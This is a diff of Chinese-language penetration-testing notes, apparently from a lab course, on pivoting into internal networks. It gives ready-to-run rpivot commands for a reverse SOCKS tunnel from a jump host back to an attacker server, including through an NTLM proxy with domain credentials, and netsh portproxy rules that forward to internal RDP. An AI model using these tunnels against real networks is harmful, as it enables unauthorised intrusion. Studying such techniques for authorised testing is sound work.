@@ -199,9 +199,10 @@ sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn                  扫描 172.16.5.0/23
 Rpivot
 反向 SOCKS 代理 (reverse SOCKS proxy) 工具
 攻击机是服务端
-跳板或目标是客户端
+跳板机是客户端
 从客户端连接服务端
   https://github.com/klsecservices/rpivot
+
 git clone https://github.com/klsecservices/rpivot.git
 python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0                       在攻击机启动服务端
 cp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/                                            传送 ripivot 到跳板
@@ -211,12 +212,25 @@ proxychains firefox-esr 172.16.5.135:80                                         
 
 在某些情况下
 可能无法直接跳板到攻击机
-一些组织配置了与域控制器 (Domain Controller) 一起使用的带 NTLM 认证的 HTTP 代理 (HTTP-proxy with NTLM authentication)
-这种情况下，可以为 rpivot 提供一个额外的 NTLM 认证，提供用户名和密码来经由 NTLM 代理进行身份验证
+一些域控制器 (Domain Controller) 使用带 NTLM 认证的 HTTP 代理 (HTTP-proxy with NTLM authentication)
+这种情况下，可以为 rpivot 提供一个额外的 NTLM 认证，提供用户名和密码来经由 NTLM，向内网边界机器进行身份验证
 可以使用 rpivot 的 client.py:
 python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
 
 
+Netsh
+Windows 命令行工具
+可使用 Netsh 完成的一些网络相关任务：
+查找路由
+查看防火墙配置
+添加代理
+创建端口转发 (port forwarding) 规则
+  https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh
+跳板是 Windows，可用
+
+C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25     从 10.129.15.150:8080，到 172.16.5.25:3389
+C:\Windows\system32> netsh.exe interface portproxy show v4tov4                                                                                            查看转发
+使用 xfreerdp 从攻击主机连接到 8080
 
 
 
@@ -226,22 +240,9 @@ python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --n
 
 
 
-Rpivot:
-  mattchow@htb[/htb]$ python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
-  ubuntu@WEB01:~/rpivot$ python2 client.py --server-ip 10.10.14.18 --server-port 9999
-
-  proxychains firefox-esr 172.16.5.135:80
-  
-  with NTLM:
-    python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
-  
-https://github.com/klsecservices/rpivot
 
 
-Netsh:
-  netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
-    netsh.exe interface portproxy show v4tov4
-    https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh
+
 
 Dnscat2:
   ATC host:
